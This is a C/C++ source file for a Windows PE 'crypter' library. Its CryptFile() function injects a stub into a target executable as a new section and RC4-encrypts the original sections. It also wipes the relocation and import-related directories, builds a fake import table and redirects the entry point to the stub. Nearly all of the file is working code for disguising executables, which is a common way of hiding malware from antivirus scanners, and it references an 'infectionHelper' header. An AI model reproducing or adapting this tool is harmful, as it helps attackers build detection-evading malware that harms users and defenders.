// Generic PE modification library by KOrUPt @ http://KOrUPt.co.uk...
// Credits to Napalm, Irwin and 'Ashkbiz Danehkar'.

// Takes care of everything...
// See function CryptFile() @ line 196... Responsible for all the hard work.

#pragma once
#include <windows.h>
#include <stdio.h>
#include <imagehlp.h>
#include "itmaker.h"
#include "itmaker.cpp"
#include "infectionHelper.h"
#define PEAlign(a, b) (((a + b - 1) / b) * b)

void RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
{
	int a, b = 0, s[256];
	BYTE swap;
	DWORD dwCount;
	for(a = 0; a < 256; a++)
		s[a] = a;
	
	for(a = 0; a < 256; a++){
		b = (b + s[a] + lpKey[a % dwKeyLen]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
	}

	for(dwCount = 0; dwCount < dwBufLen; dwCount++){
		a = (a + 1) % 256;
		b = (b + s[a]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
		lpBuf[dwCount] ^= s[(s[a] + s[b]) % 256];
	}
}

DWORD FileToVa(DWORD dwFileAddr, PIMAGE_NT_HEADERS pNtHeaders) // By Napalm
{
    PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
    for(WORD wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++){
        if(dwFileAddr >= lpSecHdr->PointerToRawData){
            if(dwFileAddr < (lpSecHdr->PointerToRawData + lpSecHdr->SizeOfRawData)){
                dwFileAddr -= lpSecHdr->PointerToRawData;
                dwFileAddr += (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
                return dwFileAddr; 
            }
        }
		
		lpSecHdr++;
    }
    
    return NULL;
}

DWORD VaToFile(DWORD dwVirtAddr, PIMAGE_NT_HEADERS pNtHeaders)
{
	PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
	DWORD dwReturn = dwVirtAddr;
	for(WORD wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++){
		if(dwReturn >= (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress)){
			if(dwReturn < (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress + lpSecHdr->Misc.VirtualSize)){
				dwReturn -= (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
				dwReturn += lpSecHdr->PointerToRawData;
				return dwReturn; 
			}
		}
		lpSecHdr++;
	}
	return NULL;
}


// By Irwin
LPMAPINFO LoadFile(LPCTSTR lpszFileName, DWORD dwStubSize) // By Irwin
{
	LPMAPINFO lpMapInfo;
	HANDLE    hFile, hFileMapping;
	LPBYTE    lpBuffer;
	DWORD     dwSize;

	hFile = CreateFile(lpszFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile != INVALID_HANDLE_VALUE){
		dwSize = GetFileSize(hFile, 0);
		if(dwSize != INVALID_FILE_SIZE)
		{
			if(dwStubSize) dwSize += dwStubSize + 4;
			
			hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
			if(hFileMapping != NULL)
			{
				lpBuffer = (LPBYTE)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwSize);
				if(lpBuffer != NULL)
				{
					lpMapInfo = (LPMAPINFO)HeapAlloc(GetProcessHeap(), 0, sizeof(MAPINFO));
					if(lpMapInfo != NULL){
						__try{
							lpMapInfo->hFile = hFile;
							lpMapInfo->hFileMapping = hFileMapping;
							lpMapInfo->lpBuffer     = lpBuffer;
							return lpMapInfo;
						} __except (EXCEPTION_EXECUTE_HANDLER){
							HeapFree(GetProcessHeap(), 0, (LPVOID)lpMapInfo);
						}
					}
				
					UnmapViewOfFile(lpBuffer);
				}
			
				CloseHandle(hFileMapping);
			}
		}
		
		CloseHandle(hFile);
	}
	
	return NULL;
}

// By Irwin
VOID UnloadFile(LPMAPINFO lpMapInfo)
{
	if(lpMapInfo != NULL){
		UnmapViewOfFile(lpMapInfo->lpBuffer);
		CloseHandle(lpMapInfo->hFileMapping);
		CloseHandle(lpMapInfo->hFile);
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpMapInfo);
	}
}

// Originally by Ashkbiz Danehkar(now slightly modified)
PIMAGE_SECTION_HEADER AddSection(PCHAR szName, DWORD dwSize, PIMAGE_NT_HEADERS pNtHeaders)
{
	DWORD roffset, rsize, voffset, vsize;
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders) + pNtHeaders->FileHeader.NumberOfSections - 1;
	
	if(pSection){
		rsize	= PEAlign(dwSize, pNtHeaders->OptionalHeader.SectionAlignment);
		vsize	= rsize;
		roffset = PEAlign(pSection->PointerToRawData + pSection->SizeOfRawData, pNtHeaders->OptionalHeader.FileAlignment);
		voffset = PEAlign(pSection->VirtualAddress + pSection->Misc.VirtualSize, pNtHeaders->OptionalHeader.SectionAlignment);
		
		// we'll likely end up corrupting this table if we continue
		if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress != 0)
			return NULL;

		pSection++;
		memset(pSection, 0, (size_t)sizeof(IMAGE_SECTION_HEADER));
		pSection->PointerToRawData	= roffset;
		pSection->VirtualAddress		= voffset;
		pSection->SizeOfRawData		= rsize;
		pSection->Misc.VirtualSize	= vsize;
		pSection->Characteristics		= 0xE0000040;
		
		memcpy(pSection->Name, szName, 8);
		pNtHeaders->FileHeader.NumberOfSections	+= 1;
		pNtHeaders->OptionalHeader.SizeOfImage	= voffset + vsize;
		return (PIMAGE_SECTION_HEADER)pSection;
	}

	return NULL;
}

/* legacy ...
__inline DWORD GetSlackSpaceOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD dwStubSize, int sectionOffset)
{
	PIMAGE_SECTION_HEADER pSection;
	
	pSection = IMAGE_FIRST_SECTION(pNtHeaders) + sectionOffset;
	if(pSection){
		if(dwStubSize < (pSection->SizeOfRawData - pSection->Misc.VirtualSize))
			return ((pSection->PointerToRawData + pSection->Misc.VirtualSize));
	}

	return 0;
}
*/

__inline DWORD CalcNewChecksum(LPMAPINFO lpMapInfo)
{
    DWORD dwHeaderSum, dwCheckSum, dwSize;
	PIMAGE_NT_HEADERS pNtHeaders;
	
	if((dwSize = GetFileSize(lpMapInfo->hFile, NULL)) != INVALID_FILE_SIZE){
		pNtHeaders = CheckSumMappedFile(lpMapInfo->lpBuffer, dwSize, &dwHeaderSum, &dwCheckSum);
		if(pNtHeaders)
			if(dwHeaderSum)
				return pNtHeaders->OptionalHeader.CheckSum;
	}
	
	return NULL;
}

// does all the hard work
BOOL CryptFile(const char *target, const char *stub, const char mode, const char *szKey)
{
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_SECTION_HEADER pSection, pSectionHeader, pIatSection;
	PIMAGE_TLS_DIRECTORY32 pImgTlsDir = NULL;
	LPMAPINFO lpMapInfo, lpStubInfo;
	DWORD dwWriteOffset = 0, dwStubSize, i;
	INT offsetSection = 0, n = 0;
	BOOL bRet = FALSE;
	
	SetLastError(E_UNEXPECTED);
		
	lpMapInfo = LoadFile(target, NULL);
	if(lpMapInfo){
		pNtHeaders = ImageNtHeader(lpMapInfo->lpBuffer);
		if(pNtHeaders){
			lpStubInfo = LoadFile(stub, NULL);
			if(lpStubInfo){
				offsetSection	= pNtHeaders->FileHeader.NumberOfSections - 1;
				dwStubSize		= GetFileSize(lpStubInfo->hFile, NULL);
				pSection		= pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
				if(pSection && dwStubSize != INVALID_FILE_SIZE){
					switch(mode){ // legacy support for new modes
						case 'n':	// append a new section
						{
							i = PEAlign(dwStubSize, pNtHeaders->OptionalHeader.SectionAlignment);
							UnloadFile(lpMapInfo);
							lpMapInfo = LoadFile(target, i); // we need to extend the file to account for the new section
							if(lpMapInfo){
								pSection = AddSection(".tls", i, pNtHeaders);
								if(pSection){
									printf("[+] Appended new section\n");
							
									memset(lpMapInfo->lpBuffer + pSection->PointerToRawData, 0x90, pSection->SizeOfRawData);
									dwWriteOffset = pSection->PointerToRawData;
								}
							}
							
							break;
						}
						
						default:{
							SetLastError(E_INVALIDARG);
							break;
						}
					}

					__try{
						if(dwWriteOffset != 0){ // no error?
							// write our stub
							memcpy(lpMapInfo->lpBuffer + dwWriteOffset, lpStubInfo->lpBuffer, dwStubSize);
							printf("[+] Inserted stub\n");
							
							// do we have a TLS table? If so alloc mem for it and store it
							pImgTlsDir = (PIMAGE_TLS_DIRECTORY32)malloc(sizeof(IMAGE_TLS_DIRECTORY32));	
							memset(pImgTlsDir, 0, sizeof(IMAGE_TLS_DIRECTORY32));
							if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0){
								i = VaToFile( // Get file offset of our TLS table
										(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
										+ pNtHeaders->OptionalHeader.ImageBase), pNtHeaders);
								
								// clone TLS table
								if(pImgTlsDir && i){
									CopyMemory(pImgTlsDir, (lpMapInfo->lpBuffer + i), sizeof(IMAGE_TLS_DIRECTORY32));
								}else printf("[-] Warning: could not copy TLS table\n");
							}

							// placeholder table. Holds data that we use in our stub!!
							DWORD dwPlaceholders[10] = { // values that our stub _needs_ to work
								(pNtHeaders->OptionalHeader.AddressOfEntryPoint + pNtHeaders->OptionalHeader.ImageBase), // 0 
								pNtHeaders->OptionalHeader.ImageBase,	// 1
								pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, // 2
								// note: the following fields will be zero'd if their is no TLS table
								pImgTlsDir->StartAddressOfRawData,		// 3
								pImgTlsDir->EndAddressOfRawData,		// 4
								(u_long)pImgTlsDir->AddressOfIndex,		// 5
								(u_long)pImgTlsDir->AddressOfCallBacks,	// 6
								(u_long)pImgTlsDir->SizeOfZeroFill,		// 7
								pImgTlsDir->Characteristics,			// 8
								// relocation table
								(u_long)pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress , // 9
							};
							
							// write offsets into stub(overwrite all occourences of 0xCCCCCCCC in stub)
							for(i = dwWriteOffset; i < dwWriteOffset + dwStubSize; i++){
								if(!memcmp(lpMapInfo->lpBuffer + i, "\xCC\xCC\xCC\xCC", 4)){ // we have a match
									// fill placeholder with correct data(standard procedure)
									*(u_long *)(lpMapInfo->lpBuffer + i) = dwPlaceholders[n];
									
									// offsets from here on(3 - 8) are dedicated toward TLS storage
									// so set the directory entry to point to the table
									if(n == 3){
										if(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0){
											// write TLS dir
											pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = (FileToVa(i, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase);
											printf("[*] TLS table rewrote @ %08x\n", pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
										}
									}
									n++;
								}
							}
							
							// free allocated tls struct
							free(pImgTlsDir); // Note: free(NULL); does nothing
						
							// encrypt sections
							for(i = 0; i < pNtHeaders->FileHeader.NumberOfSections - 1; i++){
								// don't crypt resource sections
								if(strncmp((char *)pSectionHeader->Name, ".rsrc", 4)){
									RC4(lpMapInfo->lpBuffer + pSectionHeader->PointerToRawData, (unsigned char *)szKey, pSectionHeader->SizeOfRawData, strlen(szKey));		
									printf("[+] Encrypted section %s\n", pSectionHeader->Name);
								}else printf("[-] Ignoring resource section\n");
								
								// set section characteristics
								pSectionHeader->Characteristics = 0xE0000040;
								pSectionHeader++;
							}

							// destroy IAT directories
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress = 0;
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size = 0;
							
							// destroy relocation table
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
							pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
							
							printf("[+] IAT/Relocs directories destroyed...\n", n, i);

							// ---append a fake IAT----
							// we need to extend the file, so re-map it
							FlushViewOfFile(lpMapInfo->lpBuffer, 0);
							UnloadFile(lpMapInfo);
							lpMapInfo = LoadFile(target, 4096);
							if(lpMapInfo){
								// add section for iat
								pIatSection = AddSection(".idata", 4096, pNtHeaders);
								if(pIatSection){
									// zerofill section
									memset(lpMapInfo->lpBuffer + pIatSection->PointerToRawData, 0x00, pIatSection->SizeOfRawData);
									
									printf("[+] Appending fake IAT(4kb)\n\t[*] Appended new imports section @ VA %08x\n", pIatSection->VirtualAddress);

									// build fake IAT
									CITMaker *ImportTableMaker = new CITMaker(0x0);
									ImportTableMaker->Build(pIatSection->VirtualAddress); 
									memcpy(lpMapInfo->lpBuffer + pIatSection->PointerToRawData, ImportTableMaker->pMem, ImportTableMaker->dwSize);

									// update data dirs
									pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = pIatSection->VirtualAddress;
									pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = ImportTableMaker->dwSize;
									printf("\t[+] Import data directories updated\n");
									delete ImportTableMaker;
								}
							}

							// set the new entry point
							i = FileToVa(dwWriteOffset, pNtHeaders); 
							if(i){
								pNtHeaders->OptionalHeader.AddressOfEntryPoint = i - pNtHeaders->OptionalHeader.ImageBase;
								
								// update file checksum
								if(pNtHeaders->OptionalHeader.CheckSum){
									pNtHeaders->OptionalHeader.CheckSum = CalcNewChecksum(lpMapInfo);
									printf("[+] Updated file checksum\n");
								}
								
								SetLastError(ERROR_SUCCESS);
								bRet = TRUE;
							}else printf("[-] Fatal errror: unable to set entrypoint\n");
						}else printf("[-] Fatal error: could not write stub\n");
					}__except(EXCEPTION_EXECUTE_HANDLER){ 
						printf("[-] Warning: Exception thrown\n");
					}
				}
				
				// unload
				UnloadFile(lpStubInfo);
			}
		}
		
		FlushViewOfFile(lpMapInfo->lpBuffer, 0);
		UnloadFile(lpMapInfo);
	}

	return bRet;
}